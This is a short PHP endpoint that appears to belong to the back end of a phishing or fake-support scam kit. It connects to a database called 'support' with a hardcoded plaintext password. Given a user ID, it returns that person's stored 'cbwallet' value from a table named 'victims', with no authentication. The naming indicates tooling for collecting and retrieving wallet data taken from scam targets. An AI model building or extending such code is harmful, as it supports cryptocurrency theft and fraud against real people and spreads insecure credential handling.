<?php
require '../vendor/autoload.php';

// Database connection details
$host = 'localhost';
$db   = 'support';
$user = 'phpmyadmin';
$pass = 'haha123';

$dsn = "mysql:host=$host;dbname=$db;charset=utf8mb4";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (\PDOException $e) {
    throw new \PDOException($e->getMessage(), (int)$e->getCode());
}

header('Content-Type: application/json');

// Retrieve user ID from the query parameters
$id = $_GET['id'] ?? null;

if (!$id) {
    echo json_encode(['status' => 'error', 'message' => 'No user ID provided']);
    exit;
}

// Check if the user's cbwallet value is set
$stmt = $pdo->prepare('SELECT cbwallet FROM victims WHERE id = ?');
$stmt->execute([$id]);
$user = $stmt->fetch();

if ($user) {
    if ($user['cbwallet']) {
        echo json_encode(['status' => 'success', 'has_cbwallet' => true, 'cbwallet' => $user['cbwallet']]);
    } else {
        echo json_encode(['status' => 'success', 'has_cbwallet' => false]);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'User not found']);
}
?>